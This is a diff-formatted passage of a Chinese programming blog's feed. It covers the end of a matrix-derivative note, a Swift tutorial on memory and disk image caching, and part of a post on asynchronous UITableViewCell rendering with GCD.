-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>a</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>b</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>b</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><msub><mi>b</mi><mn>3</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo>⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>c</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><msub><mi>c</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A^TA=\begin{pmatrix}
-a_1^2+a_2^2+a_3&amp;\cdots&amp;\cdots\\
-\cdots&amp;b_1^2+b_2^2+b_3&amp;\cdots\\
-\cdots&amp;\cdots&amp;c_1^2+c_2^2+c_3
-\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
-<p>则可以将L2 Norm转化为矩阵的迹形式：</p>
-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>A</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><mi>t</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo>(</mo><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">||A||^2=trace(A^TA)
-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mclose">)</span></span></span></span></span></p>
-<p>并利用以下规则求导：</p>
-<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>t</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo>(</mo><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi><mo>)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>A</mi></mrow></mfrac><mo>=</mo><mn>2</mn><mi>A</mi></mrow><annotation encoding="application/x-tex">\frac{trace(A^TA)}{\partial A}=2A
-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.204331em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183309999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">A</span></span></span></span></span></p>
-<p>最后令导数为0来计算参数矩阵。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Swift实现简单的图像缓存]]></title>
-        <id>https://hagemon.github.io/post/WcouvxJuN/</id>
-        <link href="https://hagemon.github.io/post/WcouvxJuN/">
-        </link>
-        <updated>2021-02-28T14:07:38.000Z</updated>
-        <content type="html"><![CDATA[<p>在iOS App中，为了增加用户的体验感、减少网络的请求、增加App的性能，我们在获取图像之后通常会将其进行缓存，我学习了<a href="https://juejin.cn/post/6844903807667666951">从零开始打造一个iOS图片加载框架</a>，写了一个简单的基于Swift的图像缓存。</p>
-<h2 id="图片加载">图片加载</h2>
-<p>我们从最简单的场景开始，在ViewController中实现download方法，通过URLSession下载一个图片并显示到ImageView上：</p>
-<pre><code class="language-swift">func download() {
-    let url = URL(string: &quot;https://user-gold-cdn.xitu.io/2019/3/25/169b406dfc5fe46e&quot;)
-    let session = URLSession.shared
-    let task = session.dataTask(with: url!, completionHandler: { [weak self]
-        data, res, error in
-        guard error == nil,
-              let data = data
-        else { return }
-        let image = UIImage(data: data)
-        guard let strongSelf = self else {return}
-        DispatchQueue.main.async {
-            strongSelf.imageView.image = image
-        }
-    })
-    task.resume()
-}
-</code></pre>
-<h2 id="图片缓存">图片缓存</h2>
-<p>上述的方法在每次读取页面之后都会进行下载。为了达到缓存的目的，我们创建一个工具类，以单例模式来封装图片的下载和缓存的功能。使用NSCache对图像进行缓存，当下载了以后，若后续再次需要读取这个url，则先从缓存中寻找。</p>
-<pre><code class="language-swift">class ImageDownloader: NSObject {
-    static let shared = ImageDownloader()
-    let session: URLSession
-    let cache: NSCache&lt;NSString, UIImage&gt;
-    
-    override init() {
-        self.session = URLSession.shared
-        self.cache = NSCache&lt;NSString, UIImage&gt;()
-    }
-    
-    func download(urlString: NSString, completionHandler: @escaping (UIImage?, NSError?) -&gt; ()) {
-        if urlString.length == 0 {
-            return
-        }
-        let cached = self.cache.object(forKey: urlString)
-        if cached != nil {
-            print(&quot;load \(urlString) from cache&quot;)
-            completionHandler(cached, nil)
-            return
-        }
-        guard let url = URL(string: urlString as String) else { return }
-        let task = self.session.dataTask(with: url, completionHandler: {
-            [weak self] data, res, error in
-            guard error == nil,
-                  let data = data,
-                  let strongSelf = self,
-                  let image = UIImage(data: data)
-            else {return}
-            print(&quot;\(urlString) cached&quot;)
-            strongSelf.cache.setObject(image, forKey: urlString)
-            DispatchQueue.main.async {
-                completionHandler(image, nil)
-            }
-        })
-        task.resume()
-    }
-}
-</code></pre>
-<h2 id="磁盘缓存">磁盘缓存</h2>
-<p>使用NSCache仅能把图像缓存在内存中，在下次开启app之后又要重新下载，所以需要把Data保存在磁盘之中。我们进一步把缓存功能从下载器中提取出来，封装到缓存器中。</p>
-<p>在初始化缓存器的时候，需要进行：</p>
-<ul>
-<li>内存cache创建</li>
-<li>fileManager的创建</li>
-<li>创建数据在disk保存的路径</li>
-</ul>
-<pre><code class="language-swift">override init() {
-    self.cache = NSCache&lt;NSString, UIImage&gt;()
-    self.fileManager = FileManager()
-    do {
-        self.path = try self.fileManager.url(for: .cachesDirectory, in: .userDomainMask, appropriateFor: nil, create: true).appendingPathComponent(&quot;hagemon.Cache&quot;)
-        if !self.fileManager.fileExists(atPath: self.path.absoluteString) {
-            try self.fileManager.createDirectory(at: self.path, withIntermediateDirectories: true, attributes: nil)
-        }
-    } catch {
-        fatalError(&quot;Failed to create cache on disk&quot;)
-    }
-}
-</code></pre>
-<p>同时还要实现将url的哈希，和获取文件路径的方法：</p>
-<pre><code class="language-swift">private func keyForURL(urlString: String) -&gt; String {
-    return &quot;\(urlString.hash)&quot;
-}
 
-private func urlForImage(withUrlString urlString: String) -&gt; URL {
-    let key = self.keyForURL(urlString: urlString)
-    let url = self.path.appendingPathComponent(key)
-    return url
-}
-</code></pre>
-<p>在获取图像缓存的时候，首先需要判断是否在内存中缓存，再检查是否在磁盘中有缓存：</p>
-<pre><code class="language-swift">func fetchCachedImage(with urlString: String) -&gt; UIImage? {
-    guard urlString.count &gt; 0 else {return nil}
-	// check memory cache
-    if let image = self.cache.object(forKey: urlString as NSString) {
-        print(&quot;load \(urlString) from memory cache&quot;)
-        return image
-    }
-    let url = self.urlForImage(withUrlString: urlString)
-    do {
-		// load data from url
-        let data = try Data(contentsOf: url)
-        guard let image = UIImage(data: data) else { return nil }
-        self.cache.setObject(image, forKey: urlString as NSString)
-        print(&quot;load \(urlString) from \(url.absoluteString)&quot;)
-        return image
-    } catch {
-		// url not exists
-        return nil
-    }
-}
-</code></pre>
-<p>在保存图像的时候，将图像保存到内存cache中，并在编码后保存到磁盘中：</p>
-<pre><code class="language-swift">func storeImage(image: UIImage, forKey key: String) {
-	// store to memory cache
-    self.cache.setObject(image, forKey: key as NSString)
-    print(&quot;store \(key) to memory cache&quot;)
-    guard let data = image.pngData() else {return}
-    do {
-        let url = self.urlForImage(withUrlString: key)
-		// store to disk
-        try data.write(to: url)
-        print(&quot;store \(key) to \(url.absoluteString)&quot;)
-    } catch {
-        print(error)
-        fatalError(&quot;failed to cache \(key)&quot;)
-    }
-    
-}
-</code></pre>
-<p>在Downloader中，就可以把缓存的使用改编为：</p>
-<pre><code class="language-swift">class ImageDownloader: NSObject {
-    static let shared = ImageDownloader()
-    let session: URLSession
-    
-    override init() {
-        self.session = URLSession.shared
-    }
-    
-    func download(urlString: String, completionHandler: @escaping (UIImage?, NSError?) -&gt; ()) {
-        if urlString.count == 0 {
-            return
-        }
-        let cached = ImageCache.shared.fetchCachedImage(with: urlString)
-        if cached != nil {
-            completionHandler(cached, nil)
-            return
-        }
-        guard let url = URL(string: urlString) else { return }
-        let task = self.session.dataTask(with: url, completionHandler: {
-            data, res, error in
-            guard error == nil,
-                  let data = data,
-                  let image = UIImage(data: data)
-            else {return}
-            ImageCache.shared.storeImage(image: image, forKey: urlString)
-            DispatchQueue.main.async {
-                completionHandler(image, nil)
-            }
-        })
-        task.resume()
-    }
-}
-</code></pre>
-<h2 id="异步缓存">异步缓存</h2>
-<p>有时候图像在磁盘上的存储和读写是十分消耗时间的，我们可以把这个过程放在后台进行，当存取完毕之后再更新UI。</p>
-<p>于是我们可以将获取缓存的方法由返回数据的形式改为回调的形式：</p>
-<pre><code class="language-swift">func fetchCachedImage(with urlString: String, completionHandler: @escaping (_ image: UIImage?) -&gt; ()){
-    guard urlString.count &gt; 0 else {
-        completionHandler(nil)
-        return
-    }
-    if let image = self.cache.object(forKey: urlString as NSString) {
-        print(&quot;load \(urlString) from memory cache&quot;)
-        completionHandler(image)
-    }
-    let url = self.urlForImage(withUrlString: urlString)
-    do {
-        let data = try Data(contentsOf: url)
-        guard let image = UIImage(data: data) else {
-            completionHandler(nil)
-            return
-        }
-        self.cache.setObject(image, forKey: urlString as NSString)
-        print(&quot;load \(urlString) from \(url.absoluteString)&quot;)
-        completionHandler(image)
-    } catch {
-        completionHandler(nil)
-    }
-}
-</code></pre>
-<p>在Downloader的调用中可以改为：</p>
-<pre><code class="language-swift">func download(urlString: String, completionHandler: @escaping (UIImage?, NSError?) -&gt; ()) {
-    if urlString.count == 0 {
-        return
-    }
-    ImageCache.shared.fetchCachedImage(with: urlString) {
-        cached in
-        if cached != nil {
-            completionHandler(cached, nil)
-            return
-        }
-        guard let url = URL(string: urlString) else { return }
-        let task = self.session.dataTask(with: url, completionHandler: {
-            data, res, error in
-            guard error == nil,
-                  let data = data,
-                  let image = UIImage(data: data)
-            else {return}
-            ImageCache.shared.storeImage(image: image, forKey: urlString)
-            DispatchQueue.main.async {
-                completionHandler(image, nil)
-            }
-        })
-        task.resume()
-    }
-}
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[GCD异步渲染UITableViewCell+滚动优化]]></title>
-        <id>https://hagemon.github.io/post/JK_-93cJI/</id>
-        <link href="https://hagemon.github.io/post/JK_-93cJI/">
-        </link>
-        <updated>2021-02-25T14:16:05.000Z</updated>
-        <content type="html"><![CDATA[<p>在基于feed流的应用中，有两个需要重点解决的问题：</p>
-<ul>
-<li>异步进行耗时的数据加载</li>
-<li>滚动时控制加载任务以保持滚动流畅</li>
-</ul>
-<p>设定一个简单的场景：</p>
-<ul>
-<li>基于UITableViewCell</li>
-<li>每个cell都拥有一个UIImageView</li>
-<li>在UIImageView上绘制圆角头像</li>
-<li>绘制100个cell并进行高频率的滚动</li>
-</ul>
-<p>我们可以使用Instrument和XCode的Debugger里观察这些指标：</p>
-<ul>
-<li>Average Frame Time</li>
-<li>是否离屏渲染</li>
-</ul>
-<h1 id="简单实现">简单实现</h1>
-<p>最简单的实现方式是为每一个cell上的UIImageView设置cornerRadius，但是会存在离屏渲染，且AFT很长。<br>
-其实现在直接用png并设置cornerRadius并不会被离屏渲染，这里为了展示效果特地把layer栅格化一下😅</p>
-<pre><code class="language-swift">class TableViewController: UITableViewController {
-    
-    override func viewDidLoad() {
-        super.viewDidLoad()
-    }
+                </div>
+            </article>
+        </div>
 
-    override func numberOfSections(in tableView: UITableView) -&gt; Int {
-        return 1
-    }
-
-    override func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int {
-        return 100
-    }
-
-    
-    override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell {
-        let cell = tableView.dequeueReusableCell(withIdentifier: &quot;cell&quot;, for: indexPath)
-        imageView.image = UIImage(named: &quot;\(indexPath.row % 8 + 1).png&quot;)
-        imageView.clipsToBounds = true
-        imageView.layer.cornerRadius = imageView.bounds.width / 2
-        imageView.layer.shouldRasterize = true
-        return cell
-    }
-    
-    override func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat {
-        return 50
-    }
-
-}
-</code></pre>
-<p>检测屏幕上离屏渲染的部分：</p>
-<figure data-type="image" tabindex="1"><img src="https://hagemon.github.io/post-images/1614265823958.PNG" alt="" width="300" loading="lazy"></figure>
-<p>因为在iPhone12 Pro上调试，所以在Instrument里的帧数还是挺高的😅</p>
-<h1 id="优化">优化</h1>
-<p>接下来将从：</p>
-<ul>
-<li>异步渲染</li>
-<li>绘制圆角</li>
-<li>滚动优化</li>
-</ul>
-<p>这几个方面进行优化</p>
-<h2 id="绘制圆角">绘制圆角</h2>
-<p>为UIImage写一个extension，基于UIBezierPath和Context绘制圆角图像：</p>
-<pre><code class="language-swift">extension UIImage {
-    func roundedImage(backgroundColor: UIColor=UIColor.white) -&gt; UIImage? {
-        let rect = CGRect(origin: CGPoint.zero, size: self.size)
-        let size = self.size
-        UIGraphicsBeginImageContextWithOptions(size, true, 0)
-        backgroundColor.setFill()
-        UIRectFill(rect)
-        let path = UIBezierPath(ovalIn: rect)
-        path.addClip()
-        self.draw(in: rect)
-        let rounded = UIGraphicsGetImageFromCurrentImageContext()
-        UIGraphicsEndImageContext()
-        return rounded
-    }
-}
-</code></pre>
-<h2 id="异步渲染">异步渲染</h2>
-<p>绘制圆角矩形是一个相对耗时的操作，可以把它放在global线程里进行，在绘制完成后异步调用主线程进行UI更新。</p>
-<pre><code class="language-swift">override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell {
-    let cell = tableView.dequeueReusableCell(withIdentifier: &quot;cell&quot;, for: indexPath)
-    let imageView = cell.viewWithTag(1) as! UIImageView
-
-    DispatchQueue.global().async {
-        let image = UIImage(named: &quot;\(indexPath.row % 8 + 1).png&quot;)!
-        let rounded = image.roundedImage()
-        DispatchQueue.main.async {
-            imageView.image = rounded
-        }
-    }
-    return cell
-}
-</code></pre>
-<h2 id="滚动优化">滚动优化</h2>
-<p>只是用异步渲染的话，在高频率滚动的情况下可能会对出现过的所有cell都进行加载，很容易出现内存溢出的情况，所以需要控制这些加载任务的执行。</p>
-<p>具体的实现思路为：</p>
-<ul>
-<li>使用一个字典来保存当前需要渲染的任务
-<ul>
-<li>key为indexPath.row</li>
-<li>value为需要渲染的任务</li>
-</ul>
-</li>
-<li>使用DispatchWorkItem来封装加载任务</li>
-<li>在cellForRow函数中异步执行加载任务并添加到字典中</li>
-<li>在cellDidEndDisplaying函数中取消不限时的cell的任务，并移除出字典</li>
-</ul>
-<pre><code class="language-swift">import UIKit
-
-class TableViewController: UITableViewController {
-    
-    // 用于保存图像渲染任务
-    var items: [String: DispatchWorkItem] = [:]
-
-    override func viewDidLoad() {
-        super.viewDidLoad()
-    }
-
-    // MARK: - Table view data source
-
-    override func numberOfSections(in tableView: UITableView) -&gt; Int {
-        // #warning Incomplete implementation, return the number of sections
-        return 1
-    }
-
-    override func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int {
-        return 100
-    }
-
-    
-    override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell {
-        let cell = tableView.dequeueReusableCell(withIdentifier: &quot;cell&quot;, for: indexPath)
-        let imageView = cell.viewWithTag(1) as! UIImageView
-
-        // 封装渲染任务
-        let item = DispatchWorkItem {
-            let image = UIImage(named: &quot;\(indexPath.row % 8 + 1).png&quot;)!
-            let rounded = image.roundedImage()
-            DispatchQueue.main.async {
-                // 主线程异步更新UI
-                imageView.image = rounded
-            }
-        }
-        // 添加到字典中
-        self.items.updateValue(item, forKey: &quot;\(indexPath.row)&quot;)
-        // global线程异步执行渲染任务
-        DispatchQueue.global().async {
-            item.perform()
-        }
-        return cell
-    }
-    
-    override func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat {
-        return 50
-    }
-    
-    override func tableView(_ tableView: UITableView, didEndDisplaying cell: UITableViewCell, forRowAt indexPath: IndexPath) {
-        guard let item = self.items[&quot;\(indexPath.row)&quot;] else {return}
-        // 取消已经被移除的cell中的任务
-        item.cancel()
